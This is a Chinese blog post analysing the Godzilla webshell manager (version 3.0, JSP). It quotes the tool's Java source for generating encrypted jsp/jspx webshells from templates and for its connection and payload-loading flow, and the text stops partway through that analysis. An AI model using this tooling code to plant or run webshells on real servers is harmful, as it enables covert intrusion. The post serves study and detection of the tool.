@@ -1,0 +1,472 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+     
+
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0">
+<title>哥斯拉Webshell分析-Jsp篇 | ch1e的随笔</title>
+<meta name="author" content="ch1e">
+<meta name="copyright" content="ch1e">
+
+<link rel="shortcut icon" href="https://ch1e.cn/img/favicon.ico"> 
+
+
+    <meta name="keywords" content="web安全,代码审计,Java安全">
+
+
+
+     
+    <meta name="description" content="前言考完试了，终于可以继续学习了，这两天恶补前几天的摆烂，23号就开始军训了。这篇是记录学习哥斯拉分析的过程，因为没有最新的4.0版本的源码只有3.0的，所以本文是基于3.0，具体源码可以上gayhub下载 正文Webshell文件生成分析找到core&#x2F;ui&#x2F;component&#x2F;dialog&#x2F;GenerateShellLoder.java，这是一个JDialog的子类，生成webshell的按钮点">
+<meta property="og:type" content="article">
+<meta property="og:title" content="哥斯拉Webshell分析-Jsp篇">
+<meta property="og:url" content="https://ch1e.cn/2022/06/21/godzilla/">
+<meta property="og:site_name" content="ch1e的随笔">
+<meta property="og:description" content="前言考完试了，终于可以继续学习了，这两天恶补前几天的摆烂，23号就开始军训了。这篇是记录学习哥斯拉分析的过程，因为没有最新的4.0版本的源码只有3.0的，所以本文是基于3.0，具体源码可以上gayhub下载 正文Webshell文件生成分析找到core&#x2F;ui&#x2F;component&#x2F;dialog&#x2F;GenerateShellLoder.java，这是一个JDialog的子类，生成webshell的按钮点">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://q4.qlogo.cn/headimg_dl?dst_uin=1444440144&spec=100">
+<meta property="article:published_time" content="2022-06-21T11:43:28.594Z">
+<meta property="article:modified_time" content="2022-06-21T14:44:03.104Z">
+<meta property="article:author" content="ch1e">
+<meta property="article:tag" content="web安全">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="Java安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://q4.qlogo.cn/headimg_dl?dst_uin=1444440144&spec=100">
+ 
+
+<meta http-equiv="Cache-Control" content="no-siteapp"/>
+<link href="//cdn.jsdelivr.net" rel="preconnect">
+<link href="https://ch1e.cn" rel="prefetch">
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css " rel="stylesheet">
+<link href="/css/main.css " rel="stylesheet">
+<script src="/js/utlis.js"></script>
+ 
+    
+ 
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+     
+    
+ 
+     
+
+<script>
+    var $config = {
+        tocStyle: "visible",
+        CDN:{
+            fancyboxJs: "https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js",
+            fancyboxCss: "https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css"
+        },
+        
+        
+    }
+</script>
+    
+
+
+
+
+  
+
+
+    <div id="body-wrap">
+        <nav id="nav-wrap">
+  <div class="navbar">
+    <div class="bar">
+      <a href="/" class="title">ch1e的随笔</a>
+
+      
+      <ul class="menu">
+         
+        <li><a href="/">首页</a></li>
+          
+        <li>
+          <a class="menu-child-hover" href="javascript:void(0);">找文章</a>
+          <ul class="menu-child">
+            
+            <li><a href='/tags'>标签</a></li>
+            
+            <li><a href='/archives'>归档</a></li>
+            
+          </ul>
+        </li>
+          
+        <li><a href="/link">友情链接</a></li>
+         
+      </ul>
+      <i class="fas fa-bars open-nav"></i>
+    </div>
+  </div>
+  <div id="mobile-nav">
+    <ul>
+       
+      <li><a href="/">首页</a></li>
+         
+      <li><a href='/tags'>标签</a></li>
+      
+      <li><a href='/archives'>归档</a></li>
+         
+      <li><a href="/link">友情链接</a></li>
+       
+    </ul>
+  </div>
+</nav>
+
+
+        <main id="main">
+            
+
+<article id="post">
+  <div class="post-info">
+    <div class="post-title">
+      <h1>哥斯拉Webshell分析-Jsp篇</h1>
+    </div>
+    <div class="post-meta">
+      <div class="post-date">
+        <i class="far fa-calendar-alt fa-fw post-meta-icon"></i>
+        <span class="post-meta-label">
+          发表于
+            2022-06-21 |
+        </span>
+        
+        <i class="fas fa-history fa-fw post-meta-icon"></i>
+        <span class="post-meta-label">
+          更新于
+            2022-06-21
+        </span>
+      </div>
+      <div class="post-meta-wordcount">
+        <i class="far fa-file-word fa-fw post-meta-icon"></i>
+        <span class="post-meta-label">总字数:</span>
+        <span class="word-count">2.9k | </span>
+        <i class="far fa-clock fa-fw post-meta-icon"></i>
+        <span class="post-meta-label">阅读时长:</span>
+        <span>14分钟</span>
+        
+      </div>
+    </div>
+  </div>
+  <div class="post-content">
+    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>考完试了，终于可以继续学习了，这两天恶补前几天的摆烂，23号就开始军训了。这篇是记录学习哥斯拉分析的过程，因为没有最新的4.0版本的源码只有3.0的，所以本文是基于3.0，具体源码可以上gayhub下载</p>
+<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="Webshell文件生成分析"><a href="#Webshell文件生成分析" class="headerlink" title="Webshell文件生成分析"></a>Webshell文件生成分析</h2><p>找到core/ui/component/dialog/GenerateShellLoder.java，这是一个JDialog的子类，生成webshell的按钮点击事件是通过<code>automaticBindClick.bindJButtonClick(this, this);</code>方法来进行绑定，跟进该方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">bindJButtonClick</span><span class="params">(<span class="keyword">final</span> Object fieldClass, Object eventClass)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Field[] fields = fieldClass.getClass().getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">            <span class="keyword">if</span> (field.getType().isAssignableFrom(JButton.class)) &#123;</span><br><span class="line">                field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                JButton fieldValue = (JButton) field.get(fieldClass);</span><br><span class="line">                String fieldName = field.getName();</span><br><span class="line">                <span class="keyword">if</span> (fieldValue != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">final</span> Method method = eventClass.getClass().getDeclaredMethod(fieldName + <span class="string">&quot;Click&quot;</span>, ActionEvent.class);</span><br><span class="line">                        method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        <span class="keyword">if</span> (method != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            fieldValue.addActionListener(<span class="keyword">new</span> ActionListener() &#123;</span><br><span class="line">                                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span> </span>&#123;</span><br><span class="line">                                    <span class="keyword">try</span> &#123;</span><br><span class="line">                                        method.invoke(fieldClass, e);</span><br><span class="line">                                    &#125; <span class="keyword">catch</span> (Exception e1) &#123;</span><br><span class="line">                                        e1.printStackTrace();</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">                        Log.error(fieldName + <span class="string">&quot;Click  未实现&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e2) &#123;</span><br><span class="line">        e2.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>循环遍历fieldClass的属性，如果是满足属性的类型是JButton的父类，则会获取属性名，反射调用<code>属性名+Click</code>的方法，GenerateShellLoder类的属性如下，因此这里生成webshell绑定的是<code>generateButtonClick</code>方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> JLabel passwordLabel;</span><br><span class="line"><span class="keyword">private</span> JLabel secretKeyLabel;</span><br><span class="line"><span class="keyword">private</span> JLabel cryptionLabel;</span><br><span class="line"><span class="keyword">private</span> JLabel payloadLabel;</span><br><span class="line"><span class="keyword">private</span> JTextField passwordTextField;</span><br><span class="line"><span class="keyword">private</span> JTextField secretKeyTextField;</span><br><span class="line"><span class="keyword">private</span> JComboBox&lt;String&gt; cryptionComboBox;</span><br><span class="line"><span class="keyword">private</span> JComboBox&lt;String&gt; payloadComboBox;</span><br><span class="line"><span class="keyword">private</span> JButton generateButton;</span><br><span class="line"><span class="keyword">private</span> JButton cancelButton;</span><br></pre></td></tr></table></figure>
+
+<p><code>generateButtonClick</code>方法如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">generateButtonClick</span><span class="params">(ActionEvent actionEvent)</span> </span>&#123;</span><br><span class="line">    String password = <span class="keyword">this</span>.passwordTextField.getText();</span><br><span class="line">    String secretKey = <span class="keyword">this</span>.secretKeyTextField.getText();</span><br><span class="line">    <span class="keyword">if</span> (password == <span class="keyword">null</span> || secretKey == <span class="keyword">null</span> || password.trim().length() &lt;= <span class="number">0</span> || secretKey.trim().length() &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        JOptionPane.showMessageDialog(<span class="keyword">this</span>, <span class="string">&quot;password 或\t secretKey  是空的!&quot;</span>, <span class="string">&quot;提示&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.payloadComboBox.getSelectedItem() == <span class="keyword">null</span> || <span class="keyword">this</span>.cryptionComboBox.getSelectedItem() == <span class="keyword">null</span>) &#123;</span><br><span class="line">        JOptionPane.showMessageDialog(<span class="keyword">this</span>, <span class="string">&quot;payload 或  cryption 没有选中!&quot;</span>, <span class="string">&quot;提示&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] data = ApplicationContext.getCryption((String) <span class="keyword">this</span>.payloadComboBox.getSelectedItem(), (String) <span class="keyword">this</span>.cryptionComboBox.getSelectedItem()).generate(password, secretKey);</span><br><span class="line">        <span class="keyword">if</span> (data != <span class="keyword">null</span>) &#123;</span><br><span class="line">            JFileChooser chooser = <span class="keyword">new</span> JFileChooser();</span><br><span class="line">            chooser.setFileSelectionMode(<span class="number">0</span>);</span><br><span class="line">            chooser.showDialog(<span class="keyword">new</span> JLabel(), <span class="string">&quot;选择&quot;</span>);</span><br><span class="line">            File selectdFile = chooser.getSelectedFile();</span><br><span class="line">            <span class="keyword">if</span> (selectdFile != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    FileOutputStream fileOutputStream = <span class="keyword">new</span> FileOutputStream(selectdFile);</span><br><span class="line">                    fileOutputStream.write(data);</span><br><span class="line">                    fileOutputStream.close();</span><br><span class="line">                    JOptionPane.showMessageDialog(<span class="keyword">this</span>, <span class="string">&quot;success! save file to -&gt; &quot;</span> + selectdFile.getAbsolutePath(), <span class="string">&quot;提示&quot;</span>, <span class="number">1</span>);</span><br><span class="line">                    dispose();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    Log.error(e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Log.log(<span class="string">&quot;用户取消选择....&quot;</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            JOptionPane.showMessageDialog(<span class="keyword">this</span>, <span class="string">&quot;加密器在生成时返回空&quot;</span>, <span class="string">&quot;提示&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先获取了密码和key，并且对他们进行了判断。在主要部分中，判断了data是否为空，data获取方式如下，<code>byte[] data = ApplicationContext.getCryption((String) this.payloadComboBox.getSelectedItem(), (String) this.cryptionComboBox.getSelectedItem()).generate(password, secretKey);</code></p>
+<p>这里是调用了<code>ApplicationContext.getCryption()</code>方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Cryption <span class="title">getCryption</span><span class="params">(String payloadName, String crytionName)</span> </span>&#123;</span><br><span class="line">    Class&lt;?&gt; cryptionClass = cryptionMap.get(crytionName);</span><br><span class="line">    <span class="keyword">if</span> (cryptionMap == <span class="keyword">null</span> || !((CryptionAnnotation) cryptionClass.getAnnotation(CryptionAnnotation.class)).payloadName().equals(payloadName)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (Cryption) cryptionClass.newInstance();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        Log.error(e);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>传入的参数是payload和加密方式的名字，通过<code>cryptionClass.newInstance()</code>获取对应加密的对象，然后就是调用generate方法，把密码和key作为参数传入，继续跟进，在上面生成webshell的时候，是根据自己生成的webshell选择的加密方式来选择，我如果选择JAVA_AES_BASE64，他会去获取对应的加密的对象，这里我就以BASE64的情况来分析。所以他会去调用<code>shells/cryptions/JavaAes/JavaAesBase64.java</code>类的generate方法,这里传入的key是经过md5加密并且取前16位的结果</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] generate(String password, String secretKey) &#123;</span><br><span class="line">    <span class="keyword">return</span> Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(<span class="number">0</span>, <span class="number">16</span>), <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用了<code>shells/cryptions/JavaAes/Generate.java</code>的<code>GenerateShellLoder</code>方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] GenerateShellLoder(String pass, String secretKey, <span class="keyword">boolean</span> isBin) &#123;</span><br><span class="line">    String template;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">        InputStream inputStream = Generate.class.getClassLoader().getResourceAsStream(<span class="string">&quot;shell/java/template/&quot;</span> + (isBin ? <span class="string">&quot;raw&quot;</span> : <span class="string">&quot;base64&quot;</span>) + <span class="string">&quot;GlobalCode.bin&quot;</span>);</span><br><span class="line">        String globalCode = <span class="keyword">new</span> String(functions.readInputStream(inputStream));</span><br><span class="line">        inputStream.close();</span><br><span class="line">        String globalCode2 = globalCode.replace(<span class="string">&quot;&#123;pass&#125;&quot;</span>, pass).replace(<span class="string">&quot;&#123;secretKey&#125;&quot;</span>, secretKey);</span><br><span class="line">        InputStream inputStream2 = Generate.class.getClassLoader().getResourceAsStream(<span class="string">&quot;shell/java/template/&quot;</span> + (isBin ? <span class="string">&quot;raw&quot;</span> : <span class="string">&quot;base64&quot;</span>) + <span class="string">&quot;Code.bin&quot;</span>);</span><br><span class="line">        String code = <span class="keyword">new</span> String(functions.readInputStream(inputStream2));</span><br><span class="line">        inputStream2.close();</span><br><span class="line">        Object selectedValue = JOptionPane.showInputDialog((Component) <span class="keyword">null</span>, <span class="string">&quot;suffix&quot;</span>, <span class="string">&quot;selected suffix&quot;</span>, <span class="number">1</span>, (Icon) <span class="keyword">null</span>, SUFFIX, (Object) <span class="keyword">null</span>);</span><br><span class="line">        <span class="keyword">if</span> (selectedValue == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String suffix = (String) selectedValue;</span><br><span class="line">        InputStream inputStream3 = Generate.class.getClassLoader().getResourceAsStream(<span class="string">&quot;shell/java/template/shell.&quot;</span> + suffix);</span><br><span class="line">        String template2 = <span class="keyword">new</span> String(functions.readInputStream(inputStream3));</span><br><span class="line">        inputStream3.close();</span><br><span class="line">        <span class="keyword">if</span> (suffix.equals(SUFFIX[<span class="number">1</span>])) &#123;</span><br><span class="line">            globalCode2 = globalCode2.replace(<span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&amp;lt;&quot;</span>).replace(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&amp;gt;&quot;</span>);</span><br><span class="line">            code = code.replace(<span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&amp;lt;&quot;</span>).replace(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&amp;gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ApplicationContext.isGodMode()) &#123;</span><br><span class="line">            template = template2.replace(<span class="string">&quot;&#123;globalCode&#125;&quot;</span>, functions.stringToUnicode(globalCode2)).replace(<span class="string">&quot;&#123;code&#125;&quot;</span>, functions.stringToUnicode(code));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            template = template2.replace(<span class="string">&quot;&#123;globalCode&#125;&quot;</span>, globalCode2).replace(<span class="string">&quot;&#123;code&#125;&quot;</span>, code);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> template.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;\r&quot;</span>, <span class="string">&quot;&quot;</span>).getBytes();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        Log.error(e);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据选择的加密模式，来判断用哪个模板，isBin是在<code>GenerateShellLoder</code>方法的最后一个参数，如果是false默认是base64方式，所以会用密码和key去替换<code>shell/java/template/base64Code.bin</code>和<code>base64GlobalCode.bin</code>两个文件中的{pass}和{secretKey}，然后会通过<code>suffix.equals(SUFFIX[1])</code>来判断生成jsp类型的还是jspx类型的webshell。至此webshell生成的内容就到此为止.</p>
+<h2 id="连接请求过程分析"><a href="#连接请求过程分析" class="headerlink" title="连接请求过程分析"></a>连接请求过程分析</h2><p>本地先搭建个环境，然后把我们的哥斯拉马丢上去，测试开启抓包测试连接，把哥斯拉的流量搞到burp上</p>
+<p><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220621203219190.png" alt="image-20220621203219190"></p>
+<p>这里在连接时他会先发送三个包，一个个来分析，配置webshell界面的标题是Shell Setting，所以直接搜索，在<code>core/ui/component/dialog/ShellSetting.java</code>中是配置webshell界面，继续寻找对应绑定的事件，这里的测试连接对应的是testButtonClick这个方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">testButtonClick</span><span class="params">(ActionEvent actionEvent)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!updateTempShellEntity()) &#123;</span><br><span class="line">        JOptionPane.showMessageDialog(<span class="keyword">this</span>, <span class="keyword">this</span>.error, <span class="string">&quot;提示&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">this</span>.error = <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">this</span>.shellContext.initShellOpertion()) &#123;</span><br><span class="line">        JOptionPane.showMessageDialog(<span class="keyword">this</span>, <span class="string">&quot;initShellOpertion Fail&quot;</span>, <span class="string">&quot;提示&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.shellContext.getPayloadModel().test()) &#123;</span><br><span class="line">        JOptionPane.showMessageDialog(<span class="keyword">this</span>, <span class="string">&quot;Success!&quot;</span>, <span class="string">&quot;提示&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        JOptionPane.showMessageDialog(<span class="keyword">this</span>, <span class="string">&quot;Payload Test Fail&quot;</span>, <span class="string">&quot;提示&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先先调用<code>updateTempShellEntity()</code>方法来对shellContext对象重新赋值，主要是把webshell配置界面修改的内容同步到shellContext上，然后是调用shellContext的<code>initShellOpertion</code>方法完成初始化过程</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">initShellOpertion</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">boolean</span> state = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.http = ApplicationContext.getHttp(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">this</span>.payloadModel = ApplicationContext.getPayload(<span class="keyword">this</span>.payload);</span><br><span class="line">        <span class="keyword">this</span>.cryptionModel = ApplicationContext.getCryption(<span class="keyword">this</span>.payload, <span class="keyword">this</span>.cryption);</span><br><span class="line">        <span class="keyword">this</span>.cryptionModel.init(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.cryptionModel.check()) &#123;</span><br><span class="line">            <span class="keyword">this</span>.payloadModel.init(<span class="keyword">this</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.payloadModel.test()) &#123;</span><br><span class="line">                state = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Log.error(<span class="string">&quot;payload Initialize Fail !&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Log.error(<span class="string">&quot;cryption Initialize Fail !&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> state;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        Log.error(e);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里是对自身的http,payloadModel和cryptionModel属性进行了一个赋值，每个ShellEntity对象都有一个属于自身的http属性，用于各自的http请求，这里的Payload成员属性是实现Payload接口的，他具体的实现是<code>shells/payloads/java/JavaShell.java</code>，来看看这个实现类的getPayload方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] getPayload() &#123;</span><br><span class="line">    <span class="keyword">byte</span>[] data = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        InputStream fileInputStream = JavaShell.class.getClassLoader().getResourceAsStream(<span class="string">&quot;shell/java/assets/payload.classs&quot;</span>);</span><br><span class="line">        data = functions.readInputStream(fileInputStream);</span><br><span class="line">        fileInputStream.close();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        Log.error(e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dynamicUpdateClassName(<span class="string">&quot;payload&quot;</span>, data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>他是通过读取<code>shell/java/assets/payload.classs</code>这个文件，然后经过<code>dynamicUpdateClassName</code>方法进行处理，继续跟进</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] dynamicUpdateClassName(String protoName, <span class="keyword">byte</span>[] classContent) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        CtClass ctClass = ClassPool.getDefault().makeClass(<span class="keyword">new</span> ByteArrayInputStream(classContent));</span><br><span class="line">        String className = randomName();</span><br><span class="line">        ctClass.setName(className);</span><br><span class="line">        <span class="keyword">this</span>.dynamicClassNameHashMap.put(protoName, className);</span><br><span class="line">        Log.log(<span class="string">&quot;%s -----&gt;&gt;&gt;&gt;&gt; %s&quot;</span>, protoName, className);</span><br><span class="line">        classContent = ctClass.toBytecode();</span><br><span class="line">        ctClass.detach();</span><br><span class="line">        <span class="keyword">return</span> classContent;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        Log.error(e);</span><br><span class="line">        <span class="keyword">this</span>.dynamicClassNameHashMap.put(protoName, protoName);</span><br><span class="line">        <span class="keyword">return</span> classContent;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
